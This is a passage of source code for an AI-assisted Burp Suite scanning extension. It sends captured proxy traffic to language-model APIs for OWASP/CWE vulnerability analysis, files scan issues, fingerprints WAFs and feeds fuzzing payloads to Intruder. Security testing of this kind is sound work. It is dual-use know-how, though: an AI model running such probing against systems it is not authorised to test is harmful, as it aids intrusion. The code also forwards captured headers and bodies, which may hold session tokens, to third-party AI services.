            # Get the path from URL, removing query string
            path = url.split("?")[0].lower()
            # Get the extension (last part after the final dot in the filename)
            if "/" in path:
                filename = path.split("/")[-1]
            else:
                filename = path
            if "." in filename:
                ext = filename.split(".")[-1]
                if ext in self.SKIP_EXTENSIONS:
                    if self.VERBOSE:
                        self.stdout.println(
                            "[SKIP] Static file extension: .%s - %s" % (ext, url[:80])
                        )
                    return True
            return False
        except:
            return False

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if messageIsRequest:
            return

        # Check if passive scanning is enabled
        if not self.PASSIVE_SCANNING_ENABLED:
            return

        TOOL_PROXY = 4
        if toolFlag != TOOL_PROXY:
            return

        url_str = None
        try:
            req = self.helpers.analyzeRequest(messageInfo)
            url_str = str(req.getUrl())
            if self.VERBOSE:
                self.stdout.println("\n[HTTP] URL: %s" % url_str)

            if not self.is_in_scope(url_str):
                if self.VERBOSE:
                    self.stdout.println(
                        "[HTTP] URL: %s - [SKIP] Out of scope" % url_str
                    )
                return

            # Skip static file extensions
            if self.should_skip_extension(url_str):
                return

        except:
            url_str = "Unknown"

        task_id = self.addTask("HTTP", url_str, "Queued", messageInfo)
        t = threading.Thread(target=self.analyze, args=(messageInfo, url_str, task_id))
        t.setDaemon(True)
        t.start()

    def analyze(self, messageInfo, url_str=None, task_id=None):
        with self.semaphore:
            try:
                time_since_last = time.time() - self.last_request_time
                if time_since_last < self.min_delay:
                    wait_time = self.min_delay - time_since_last
                    if task_id is not None:
                        self.updateTask(task_id, "Waiting (Rate Limit)")
                    time.sleep(wait_time)

                self.last_request_time = time.time()
                if task_id is not None:
                    self.updateTask(task_id, "Analyzing")

                self._perform_analysis(messageInfo, "HTTP", url_str, task_id)

                if task_id is not None:
                    self.updateTask(task_id, "Completed")
            except Exception as e:
                self.stderr.println("[!] HTTP error: %s" % e)
                if task_id is not None:
                    self.updateTask(task_id, "Error: %s" % str(e)[:30])
                self.updateStats("errors")
            finally:
                self.refreshUI()

    def analyze_forced(self, messageInfo, url_str=None, task_id=None):
        """
        Forced analysis that bypasses deduplication.
        Used for context menu re-analysis of already-analyzed requests.
        """
        with self.semaphore:
            try:
                time_since_last = time.time() - self.last_request_time
                if time_since_last < self.min_delay:
                    wait_time = self.min_delay - time_since_last
                    if task_id is not None:
                        self.updateTask(task_id, "Waiting (Rate Limit)")
                    time.sleep(wait_time)

                self.last_request_time = time.time()
                if task_id is not None:
                    self.updateTask(task_id, "Analyzing (Forced)")

                # Call _perform_analysis with bypass_dedup=True
                self._perform_analysis(
                    messageInfo, "CONTEXT", url_str, task_id, bypass_dedup=True
                )

                if task_id is not None:
                    self.updateTask(task_id, "Completed")
            except Exception as e:
                self.stderr.println("[!] Context menu error: %s" % e)
                if task_id is not None:
                    self.updateTask(task_id, "Error: %s" % str(e)[:30])
                self.updateStats("errors")
            finally:
                self.refreshUI()

    def _get_url_hash(self, url, params):
        param_names = sorted([p.getName() for p in params])
        normalized = str(url).split("?")[0] + "|" + "|".join(param_names)
        return hashlib.md5(normalized.encode("utf-8")).hexdigest()

    def _get_finding_hash(self, url, title, cwe, param_name=""):
        key = "%s|%s|%s|%s" % (
            str(url).split("?")[0],
            title.lower().strip(),
            cwe,
            param_name,
        )
        return hashlib.md5(key.encode("utf-8")).hexdigest()

    def _perform_analysis(
        self, messageInfo, source, url_str=None, task_id=None, bypass_dedup=False
    ):
        try:
            req = self.helpers.analyzeRequest(messageInfo)
            res = self.helpers.analyzeResponse(messageInfo.getResponse())
            url = str(req.getUrl())

            if not url_str:
                url_str = url

            params = req.getParameters()
            url_hash = self._get_url_hash(url, params)

            # Check deduplication unless bypass requested (e.g., context menu)
            if not bypass_dedup:
                with self.url_lock:
                    if url_hash in self.processed_urls:
                        if self.VERBOSE:
                            self.stdout.println(
                                "[%s] URL: %s - [SKIP] Already analyzed"
                                % (source, url_str)
                            )
                        if task_id is not None:
                            self.updateTask(task_id, "Skipped (Already Analyzed)")
                        self.updateStats("skipped_duplicate")
                        return

                    self.processed_urls.add(url_hash)
            else:
                # Context menu re-analysis - force fresh analysis
                if self.VERBOSE:
                    self.stdout.println(
                        "[%s] URL: %s - [FORCE] Bypassing deduplication"
                        % (source, url_str)
                    )

            request_bytes = messageInfo.getRequest()
            try:
                # Use Burp's helper for safe string conversion
                req_body = self.helpers.bytesToString(
                    request_bytes[req.getBodyOffset() :]
                )[:2000]
            except Exception as e:
                if self.VERBOSE:
                    self.stdout.println("[DEBUG] Request body decode error: %s" % e)
                req_body = "[Binary/non-UTF8 content]"

            req_headers = [str(h) for h in req.getHeaders()[:10]]

            response_bytes = messageInfo.getResponse()
            try:
                # Use Burp's helper for safe string conversion
                res_body = self.helpers.bytesToString(
                    response_bytes[res.getBodyOffset() :]
                )[:3000]
            except Exception as e:
                if self.VERBOSE:
                    self.stdout.println("[DEBUG] Response body decode error: %s" % e)
                res_body = "[Binary/non-UTF8 content]"

            res_headers = [str(h) for h in res.getHeaders()[:10]]
            waf_profile = {"detected": False}
            if self.ENABLE_WAF_DETECTION:
                waf_profile = self._detect_waf_profile(
                    messageInfo=messageInfo,
                    response_text=res_body,
                    response_headers=res_headers,
                )

            params_sample = [
                {
                    "name": p.getName(),
                    "value": p.getValue()[:150],
                    "type": str(p.getType()),
                }
                for p in params[:5]
            ]

            data = {
                "url": url,
                "method": req.getMethod(),
                "status": res.getStatusCode(),
                "mime_type": res.getStatedMimeType(),
                "params_count": len(params),
                "params_sample": params_sample,
                "request_headers": req_headers,
                "request_body": req_body,
                "response_headers": res_headers,
                "response_body": res_body,
                "waf_profile": waf_profile,
            }

            if self.VERBOSE:
                self.stdout.println("[%s] Analyzing (NEW)" % source)

            ai_text = self.ask_ai(self.build_prompt(data))

            if not ai_text:
                if self.VERBOSE:
                    self.stdout.println("[%s] [ERROR] No AI response" % source)
                if task_id is not None:
                    self.updateTask(task_id, "Error (No AI Response)")
                self.updateStats("errors")
                return

            self.updateStats("analyzed")

            ai_text = ai_text.strip()

            if ai_text.startswith("```"):
                import re

                ai_text = re.sub(
                    r"^```(?:json)?\n?|```$", "", ai_text, flags=re.MULTILINE
                ).strip()

            start = ai_text.find("[")
            end = ai_text.rfind("]")
            if start != -1 and end != -1:
                ai_text = ai_text[start : end + 1]
            elif ai_text.find("{") != -1:
                obj_start = ai_text.find("{")
                obj_end = ai_text.rfind("}")
                if obj_start != -1 and obj_end != -1:
                    ai_text = "[" + ai_text[obj_start : obj_end + 1] + "]"

            try:
                findings = json.loads(ai_text)
            except ValueError as e:
                self.stderr.println("[!] JSON parse error: %s" % e)
                self.stderr.println("[!] Attempting to repair malformed JSON...")

                # Try multiple repair strategies
                repaired = False

                try:
                    import re

                    original_text = ai_text

                    # Strategy 1: Fix unterminated strings by adding closing quotes
                    lines = ai_text.split("\n")
                    fixed_lines = []
                    for line in lines:
                        # Skip empty lines
                        if not line.strip():
                            fixed_lines.append(line)
                            continue

                        # Count unescaped quotes
                        quote_positions = []
                        i = 0
                        while i < len(line):
                            if line[i] == '"' and (i == 0 or line[i - 1] != "\\"):
                                quote_positions.append(i)
                            i += 1

                        # If odd number of quotes, try to fix
                        if len(quote_positions) % 2 == 1:
                            # Add closing quote before trailing comma/bracket/brace
                            line = line.rstrip()
                            if (
                                line.endswith(",")
                                or line.endswith("}")
                                or line.endswith("]")
                            ):
                                line = line[:-1] + '"' + line[-1]
                            elif not line.endswith('"'):
                                line = line + '"'

                        fixed_lines.append(line)

                    ai_text = "\n".join(fixed_lines)

                    # Strategy 2: Remove trailing commas
                    ai_text = re.sub(r",(\s*[}\]])", r"\1", ai_text)

                    # Strategy 3: Ensure valid array structure
                    ai_text = ai_text.strip()
                    if not ai_text.startswith("["):
                        if ai_text.startswith("{"):
                            ai_text = "[" + ai_text
                        else:
                            # Find first {
                            start_obj = ai_text.find("{")
                            if start_obj != -1:
                                ai_text = "[" + ai_text[start_obj:]

                    if not ai_text.endswith("]"):
                        if ai_text.endswith("}"):
                            ai_text = ai_text + "]"
                        else:
                            # Find last }
                            end_obj = ai_text.rfind("}")
                            if end_obj != -1:
                                ai_text = ai_text[: end_obj + 1] + "]"

                    # Strategy 4: Remove any garbage after final ]
                    final_bracket = ai_text.rfind("]")
                    if final_bracket != -1 and final_bracket < len(ai_text) - 1:
                        ai_text = ai_text[: final_bracket + 1]

                    # Try parsing repaired JSON
                    findings = json.loads(ai_text)
                    repaired = True
                    self.stdout.println("[+] JSON successfully repaired")

                except Exception as repair_error:
                    self.stderr.println("[!] JSON repair failed: %s" % repair_error)

                if not repaired:
                    # Last resort: try to extract any valid JSON objects
                    self.stderr.println("[!] Attempting last-resort JSON extraction...")
                    try:
                        import re

                        # Find all {...} objects
                        objects = re.findall(r"\{[^}]+\}", original_text, re.DOTALL)
                        if objects:
                            # Try each object
                            findings = []
                            for obj_str in objects[:5]:  # Limit to first 5
                                try:
                                    obj = json.loads(obj_str)
                                    findings.append(obj)
                                except:
                                    pass

                            if findings:
                                self.stdout.println(
                                    "[+] Extracted %d valid objects from malformed JSON"
                                    % len(findings)
                                )
                                repaired = True
                    except:
                        pass

                if not repaired:
                    self.stderr.println(
                        "[!] All repair attempts failed - skipping this analysis"
                    )
                    self.stderr.println("[!] AI response was too malformed to parse")
                    if self.VERBOSE:
                        self.stderr.println(
                            "[DEBUG] Failed response (first 1000 chars):"
                        )
                        self.stderr.println(original_text[:1000])
                    if task_id is not None:
                        self.updateTask(task_id, "Error (JSON Parse Failed)")
                    self.updateStats("errors")
                    return

            if not isinstance(findings, list):
                findings = [findings]

            created = 0
            skipped_dup = 0
            skipped_low_conf = 0

            for item in findings:
                title = item.get("title", "AI Finding")
                severity = item.get("severity", "information").lower().strip()
                ai_conf = item.get("confidence", 50)

                # Ensure ai_conf is an integer
                try:
                    ai_conf = int(ai_conf)
                except (ValueError, TypeError):
                    ai_conf = 50  # Default if conversion fails

                detail = item.get("detail", "")
                cwe = item.get("cwe", "")

                param_name = ""
                if params_sample:
                    param_name = params_sample[0].get("name", "")

                burp_conf = map_confidence(ai_conf)
                if not burp_conf:
                    skipped_low_conf += 1
                    if self.VERBOSE:
                        self.stdout.println(
                            "[%s] URL: %s - [SKIP] Low confidence" % (source, url_str)
                        )
                    self.updateStats("skipped_low_confidence")
                    continue

                finding_hash = self._get_finding_hash(url, title, cwe, param_name)
                with self.findings_lock:
                    if finding_hash in self.findings_cache:
                        skipped_dup += 1
                        if self.VERBOSE:
                            self.stdout.println(
                                "[%s] URL: %s - [SKIP] Duplicate finding"
                                % (source, url_str)
                            )
                        self.updateStats("skipped_duplicate")
                        continue
                    self.findings_cache[finding_hash] = True

                severity = VALID_SEVERITIES.get(severity, "Information")

                detail_parts = []
                detail_parts.append("<b>Description:</b><br>%s<br>" % detail)
                detail_parts.append("<br><b>AI Confidence:</b> %d%%<br>" % ai_conf)

                if params_sample:
                    detail_parts.append("<br><b>Affected Parameter(s):</b><br>")
                    for param in params_sample[:3]:
                        param_name = param.get("name", "")
                        param_type = param.get("type", 0)
                        type_str = {0: "URL", 1: "Body", 2: "Cookie"}.get(
                            param_type, "Unknown"
                        )
                        detail_parts.append(
                            "<code>%s (%s parameter)</code><br>"
                            % (param_name, type_str)
                        )

                if item.get("cwe"):
                    cwe_id = item.get("cwe")
                    detail_parts.append("<br><b>CWE:</b><br>%s<br>" % cwe_id)
                    detail_parts.append(
                        "<a href='https://cwe.mitre.org/data/definitions/%s.html'>View CWE Details</a><br>"
                        % cwe_id.replace("CWE-", "")
                    )

                if item.get("owasp"):
                    detail_parts.append(
                        "<br><b>OWASP:</b><br>%s<br>" % item.get("owasp")
                    )

                if item.get("remediation"):
                    detail_parts.append(
                        "<br><b>Remediation:</b><br>%s<br>" % item.get("remediation")
                    )

                if waf_profile.get("detected"):
                    detail_parts.append(
                        "<br><b>WAF Fingerprint:</b> %s (confidence %s%%)<br>"
                        % (
                            waf_profile.get("vendor", "Generic WAF"),
                            str(waf_profile.get("confidence", 0)),
                        )
                    )

                detail_parts.append("<br><br><b>Enhanced Verification:</b><br>")
                detail_parts.append(
                    "<i>Use Verify Selected for WAF-aware payload retries, OOB checks, "
                    "and Intruder-ready fuzzing payloads.</i><br>"
                )

                full_detail = "".join(detail_parts)

                issue = CustomScanIssue(
                    messageInfo.getHttpService(),
                    req.getUrl(),
                    [messageInfo],
                    title,
                    full_detail,
                    severity,
                    burp_conf,
                )
                self.callbacks.addScanIssue(issue)
                created += 1
                self.updateStats("findings_created")

                # Store vulnerability details for verification
                vuln_details = {
                    "cwe": cwe,
                    "detail": detail,
                    "param_name": param_name,
                    "owasp": item.get("owasp", ""),
                    "waf_profile": waf_profile,
                }
                self.add_finding(url, title, severity, burp_conf, messageInfo, vuln_details)

            if self.VERBOSE:
                self.stdout.println(
                    "[%s] Created:%d | Dup:%d | LowConf:%d"
                    % (source, int(created), int(skipped_dup), int(skipped_low_conf))
                )

        except Exception as e:
            self.stderr.println("[!] %s error: %s" % (source, e))
            self.updateStats("errors")

    def build_prompt(self, data):
        return (
            "Security expert. Output ONLY JSON array. NO markdown.\n"
            "Analyze for OWASP Top 10, CWE.\n"
            "Categories: Injection, XSS, Auth, Access Control, Misconfiguration, SSRF, Path Traversal, SSTI.\n"
            'Format: {"title":"name","severity":"High|Medium|Low|Information",'
            '"confidence":50-100,"detail":"desc","cwe":"CWE-X",'
            '"owasp":"A0X:2021","remediation":"fix"}\n'
            "Data:\n%s\n"
        ) % json.dumps(data, indent=2)

    def _normalize_ai_temperature(self, temperature):
        if temperature is None:
            return 0.0
        try:
            value = float(temperature)
        except:
            value = 0.0
        if value < 0.0:
            return 0.0
        if value > 1.0:
            return 1.0
        return value

    def ask_ai(self, prompt, temperature=None):
        ai_temperature = self._normalize_ai_temperature(temperature)
        try:
            if self.AI_PROVIDER == "Ollama":
                return self._ask_ollama(prompt, ai_temperature)
            elif self.AI_PROVIDER == "OpenAI":
                return self._ask_openai(prompt, ai_temperature)
            elif self.AI_PROVIDER == "Claude":
                return self._ask_claude(prompt, ai_temperature)
            elif self.AI_PROVIDER == "Gemini":
                return self._ask_gemini(prompt, ai_temperature)
            elif self.AI_PROVIDER == "OpenAI Compatible":
                return self._ask_openai_compatible(prompt, ai_temperature)
            else:
                self.stderr.println("[!] Unknown AI provider: %s" % self.AI_PROVIDER)
                return None
        except Exception as e:
            self.stderr.println("[!] AI request failed: %s" % e)
            return None

    def _ask_ollama(self, prompt, temperature=0.0):
        """Send request to Ollama with timeout and retry logic"""
        generate_url = self.API_URL.rstrip("/") + "/api/generate"

        payload = {
            "model": self.MODEL,
            "prompt": prompt,
            "stream": False,
            "format": "json",
            "options": {"temperature": temperature, "num_predict": self.MAX_TOKENS},
        }

        max_retries = 2
        retry_count = 0

        while retry_count <= max_retries:
            try:
                if self.VERBOSE and retry_count > 0:
                    self.stdout.println(
                        "[DEBUG] Retry attempt %d/%d..." % (retry_count, max_retries)
                    )

                req = urllib2.Request(
                    generate_url,
                    data=json.dumps(payload).encode("utf-8"),
                    headers={"Content-Type": "application/json"},
                )

                # Use configurable timeout
                resp = urllib2.urlopen(req, timeout=self.AI_REQUEST_TIMEOUT)

                raw = resp.read().decode("utf-8", "ignore")
                response_json = json.loads(raw)
                ai_response = response_json.get("response", "").strip()

                if response_json.get("done_reason") == "length":
                    ai_response = self._fix_truncated_json(ai_response)

                return ai_response

            except urllib2.URLError as e:
                if "timed out" in str(e) or "timeout" in str(e).lower():
                    retry_count += 1
                    if retry_count <= max_retries:
                        self.stderr.println(
                            "[!] Request timeout, retrying... (%d/%d)"
                            % (retry_count, max_retries)
                        )
                        time.sleep(2)  # Wait 2 seconds before retry
                    else:
                        self.stderr.println(
                            "[!] Request failed after %d retries (timeout: %ds)"
                            % (max_retries, int(self.AI_REQUEST_TIMEOUT))
                        )
                        self.stderr.println(
                            "[!] Try increasing timeout in Settings or using a faster model"
                        )
                        raise
                else:
                    # Non-timeout error, don't retry
                    raise
            except Exception as e:
                # Other errors, don't retry
                raise

        return None

    def _ask_openai(self, prompt, temperature=0.0):
        """Send request to OpenAI with configurable timeout"""
        req = urllib2.Request(
            self.API_URL.rstrip("/") + "/chat/completions",
            data=json.dumps(
                {
                    "model": self.MODEL,
                    "messages": [{"role": "user", "content": prompt}],
                    "max_tokens": self.MAX_TOKENS,
                    "temperature": temperature,
                }
            ).encode("utf-8"),
            headers={
                "Content-Type": "application/json",
                "Authorization": "Bearer " + self.API_KEY,
            },
        )

        resp = urllib2.urlopen(req, timeout=self.AI_REQUEST_TIMEOUT)
        data = json.loads(resp.read())
        return data["choices"][0]["message"]["content"]

    def _ask_claude(self, prompt, temperature=0.0):
        """Send request to Claude with configurable timeout"""
        req = urllib2.Request(
            self.API_URL.rstrip("/") + "/messages",
            data=json.dumps(
                {
                    "model": self.MODEL,
                    "max_tokens": self.MAX_TOKENS,
                    "temperature": temperature,
                    "messages": [{"role": "user", "content": prompt}],
                }
            ).encode("utf-8"),
            headers={
                "Content-Type": "application/json",
                "x-api-key": self.API_KEY,
                "anthropic-version": "2023-06-01",
            },
        )

        resp = urllib2.urlopen(req, timeout=self.AI_REQUEST_TIMEOUT)
        data = json.loads(resp.read())
        return data["content"][0]["text"]

    def _ask_gemini(self, prompt, temperature=0.0):
        """Send request to Google Gemini with configurable timeout"""
        req = urllib2.Request(
            self.API_URL.rstrip("/")
            + "/models/%s:generateContent?key=%s" % (self.MODEL, self.API_KEY),
            data=json.dumps(
                {
                    "contents": [{"parts": [{"text": prompt}]}],
                    "generationConfig": {
                        "maxOutputTokens": self.MAX_TOKENS,
                        "temperature": temperature,
                    },
                }
            ).encode("utf-8"),
            headers={"Content-Type": "application/json"},
        )

        resp = urllib2.urlopen(req, timeout=self.AI_REQUEST_TIMEOUT)
        data = json.loads(resp.read())
        return data["candidates"][0]["content"]["parts"][0]["text"]

    def _ask_openai_compatible(self, prompt, temperature=0.0):
        """Send request to OpenAI-compatible API (OpenRouter, Together AI, Groq, etc.)"""
        # Ensure str (bytes) not unicode for Jython compatibility
        base_url = str(self.API_URL.rstrip("/"))
        api_key = str(self.API_KEY)
        model = str(self.MODEL)

        payload = json.dumps({
            "model": model,
            "messages": [{"role": "user", "content": prompt}],
            "max_tokens": self.MAX_TOKENS,
            "temperature": temperature,
        })
        req = urllib2.Request(base_url + "/chat/completions", data=payload)
        req.add_header("Content-Type", "application/json")
        req.add_header("Authorization", "Bearer " + api_key)
        req.add_header("HTTP-Referer", "https://code-x.my")
        req.add_header("X-Title", "Code-AIxBurp")

        resp = urllib2.urlopen(req, timeout=self.AI_REQUEST_TIMEOUT)
        data = json.loads(resp.read())
        return data["choices"][0]["message"]["content"]

    def _fix_truncated_json(self, text):
        if not text:
            return "[]"
        try:
            json.loads(text)
            return text
        except:
            pass

        last_brace = text.rfind("}")
        if last_brace > 0:
            prefix = text[: last_brace + 1]
            if prefix.count("[") > prefix.count("]"):
                try:
                    fixed = prefix + "\n]"
                    json.loads(fixed)
                    return fixed
                except:
                    pass
        return "[]"


# UI Component Classes
class StatusCellRenderer(DefaultTableCellRenderer):
    def getTableCellRendererComponent(
        self, table, value, isSelected, hasFocus, row, column
    ):
        c = DefaultTableCellRenderer.getTableCellRendererComponent(
            self, table, value, isSelected, hasFocus, row, column
        )

        if value:
            status = str(value)
            # Priority order for status colors
            if "Cancelled" in status:
                c.setForeground(Color(150, 0, 0))  # Dark red
                c.setFont(Font("Monospaced", Font.BOLD, 12))
            elif "Paused" in status:
                c.setForeground(Color(150, 150, 0))  # Dark yellow
                c.setFont(Font("Monospaced", Font.BOLD, 12))
            elif "Error" in status:
                c.setForeground(Color(200, 0, 0))  # Red
                c.setFont(Font("Monospaced", Font.BOLD, 12))
            elif "Skipped" in status:
                c.setForeground(Color(200, 100, 0))  # Orange
            elif "Completed" in status:
                c.setForeground(Color(0, 150, 0))  # Green
            elif "Analyzing" in status or "Waiting" in status:
                c.setForeground(Color(0, 100, 200))  # Blue
            elif "Queued" in status:
                c.setForeground(Color(100, 100, 100))  # Gray
            else:
                c.setForeground(Color.BLACK)

        return c


class SeverityCellRenderer(DefaultTableCellRenderer):
    def getTableCellRendererComponent(
        self, table, value, isSelected, hasFocus, row, column
    ):
        c = DefaultTableCellRenderer.getTableCellRendererComponent(
            self, table, value, isSelected, hasFocus, row, column
        )
        c.setFont(Font("Monospaced", Font.BOLD, 12))

        if value:
            severity = str(value)
            if severity == "High":
                c.setForeground(Color.WHITE)
                c.setBackground(Color(200, 0, 0))
            elif severity == "Medium":
                c.setForeground(Color.WHITE)
                c.setBackground(Color(255, 140, 0))
            elif severity == "Low":
                c.setForeground(Color.BLACK)
                c.setBackground(Color(255, 200, 0))
            elif severity == "Information":
                c.setForeground(Color.WHITE)
                c.setBackground(Color(0, 100, 200))
            else:
                c.setForeground(Color.BLACK)
                c.setBackground(Color.WHITE)

        return c


class ConfidenceCellRenderer(DefaultTableCellRenderer):
    def getTableCellRendererComponent(
        self, table, value, isSelected, hasFocus, row, column
    ):
        c = DefaultTableCellRenderer.getTableCellRendererComponent(
            self, table, value, isSelected, hasFocus, row, column
        )
        c.setFont(Font("Monospaced", Font.BOLD, 11))

        if value:
            confidence = str(value)
            if confidence == "Certain":
                c.setForeground(Color(0, 150, 0))
            elif confidence == "Firm":
                c.setForeground(Color(0, 100, 200))
            elif confidence == "Tentative":
                c.setForeground(Color(200, 100, 0))
            else:
                c.setForeground(Color.BLACK)

        return c


class VerifiedCellRenderer(DefaultTableCellRenderer):
    def getTableCellRendererComponent(
        self, table, value, isSelected, hasFocus, row, column
    ):
        c = DefaultTableCellRenderer.getTableCellRendererComponent(
            self, table, value, isSelected, hasFocus, row, column
        )
        c.setFont(Font("Monospaced", Font.BOLD, 11))

        if value:
            status = str(value)
            if status == "Confirmed":
                c.setForeground(Color(200, 0, 0))  # Red - confirmed vuln
                c.setBackground(Color(255, 230, 230))
            elif status == "False Positive":
                c.setForeground(Color(100, 100, 100))  # Gray
                c.setBackground(Color(240, 240, 240))
            elif status == "Pending":
                c.setForeground(Color(150, 150, 0))  # Yellow/olive
                c.setBackground(Color.WHITE)
            elif status == "Verifying...":
                c.setForeground(Color(0, 100, 200))  # Blue
                c.setBackground(Color(230, 240, 255))
            elif status == "Uncertain":
                c.setForeground(Color(200, 100, 0))  # Orange
                c.setBackground(Color(255, 245, 230))
            elif status == "Error":
                c.setForeground(Color(150, 0, 0))  # Dark red
                c.setBackground(Color(255, 220, 220))
            else:
                c.setForeground(Color.BLACK)
                c.setBackground(Color.WHITE)

            if isSelected:
                c.setBackground(table.getSelectionBackground())

        return c


class CodeAIxBurpIntruderPayloadGenerator(IIntruderPayloadGenerator):
    def __init__(self, extender):
        self.extender = extender
        self.payloads = extender.get_intruder_payloads()
        self.index = 0

    def hasMorePayloads(self):
        return self.index < len(self.payloads)

    def getNextPayload(self, baseValue):
        if self.index >= len(self.payloads):
            return self.extender.helpers.stringToBytes("")
        payload = self.payloads[self.index]
        self.index += 1
        return self.extender.helpers.stringToBytes(str(payload))

    def reset(self):
        self.payloads = self.extender.get_intruder_payloads()
        self.index = 0


class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, messages, name, detail, severity, confidence):
        self._httpService = httpService
        self._url = url
        self._messages = messages
        self._name = name
        self._detail = detail
        self._severity = severity
        self._confidence = confidence

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0x80000003

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return self._confidence

    def getIssueDetail(self):
        return self._detail

    def getHttpMessages(self):
        return self._messages

    def getHttpService(self):
        return self._httpService

    def getIssueBackground(self):
        return None

    def getRemediationBackground(self):
        return None

    def getRemediationDetail(self):
        return None
